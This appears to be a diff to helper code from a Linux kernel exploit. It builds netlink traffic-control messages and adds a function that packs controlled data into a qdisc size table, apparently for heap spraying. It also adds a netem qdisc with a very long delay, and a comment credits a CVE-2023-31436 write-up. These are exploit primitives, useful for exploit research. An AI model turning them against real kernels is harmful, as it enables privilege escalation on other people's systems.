@@ -108,20 +108,7 @@ struct tf_msg * hfscQdiscAdd(short defcls) {
     m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(defcls), &defcls));
     return m;
 }
-struct tf_msg * qdiscAdd(const char *name,u32 parent, u32 handle) {
-    // Kernel Handler: function hfsc_init_qdisc
-    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
-    // -> Calling tc_modify_qdisc 
-    init_tf_msg(m);
-    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
-    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
-    m->tcm.tcm_handle    = handle;
-    m->tcm.tcm_parent    = parent;
-    
-    // Set TCA_KIND     
-    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name));
-    return m;
-}
+
 
 struct tf_msg * hfscClassAdd(enum hfsc_class_flags type, u32 classid, u32 parentid){
     // Kernel Handler: function  hfsc_change_class
@@ -171,7 +158,34 @@ struct tf_msg * hfscClassDel(u32 classid){
 
 
 
+struct tf_msg * contactQdiscStab(struct tf_msg * m, char *data , size_t size){
+    // 0x40 for header
+    // struct qdisc_size_table {
+    // 	struct rcu_head		rcu;
+    // 	struct list_head	list;
+    // 	struct tc_sizespec	szopts;
+    // 	int			refcnt;
+    // 	u16			data[];
+    // };
+    struct tc_sizespec ctx;
+    memset(&ctx,0,sizeof(struct tc_sizespec));
+    ctx.cell_log = 10;
+    ctx.tsize    = size / sizeof(u16);
 
+    // Expand the space
+    m = realloc(m, sizeof(struct tf_msg) + sizeof(struct tc_sizespec)+0x200);
+    
+    struct rtattr *opts     = (char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len);
+    opts->rta_type          = TCA_STAB;
+    opts->rta_len           = NLA_HDRLEN;
+
+
+    opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_STAB_BASE, sizeof(struct tc_sizespec), &ctx));
+    opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_STAB_DATA, size, data));
+    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
+
+    return m;
+}
 
 struct tf_msg * qfqQdiscAdd() {
     // Kernel Handler: function hfsc_init_qdisc
@@ -211,10 +225,7 @@ struct tf_msg * qfqClassAdd(enum hfsc_class_flags type, u32 classid,u32 val){
     m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
     return m;
 }
-#include <linux/pkt_sched.h>
-#include <linux/pkt_cls.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+
 
 struct tf_msg *qfqFilterAdd(unsigned short prio) {
     struct tf_msg *m = calloc(1, sizeof(struct tf_msg));
@@ -242,5 +253,28 @@ struct tf_msg *qfqFilterAdd(unsigned short prio) {
     );
 
     m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
+    return m;
+}
+
+
+struct tf_msg * netemQdiscAdd(const char *name,u32 parent, u32 handle, u32 usec) {
+    // Learned from KCTF cve-2023-31436 write up
+    // Kernel Handler: function hfsc_init_qdisc
+    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
+    // -> Calling tc_modify_qdisc 
+    init_tf_msg(m);
+    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
+    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
+    m->tcm.tcm_handle    = handle >> 16 << 16;
+    m->tcm.tcm_parent    = parent;
+    
+    // Set TCA_KIND     
+    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name));
+
+    // Add delay attribute to TCA_OPTIONS
+    struct tc_netem_qopt qopt_attr={};
+    qopt_attr.latency = 1000u * 1000 * 5000 * usec; // Delay in us
+    qopt_attr.limit   = 1;
+    m->nlh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(qopt_attr), &qopt_attr));
     return m;
 }
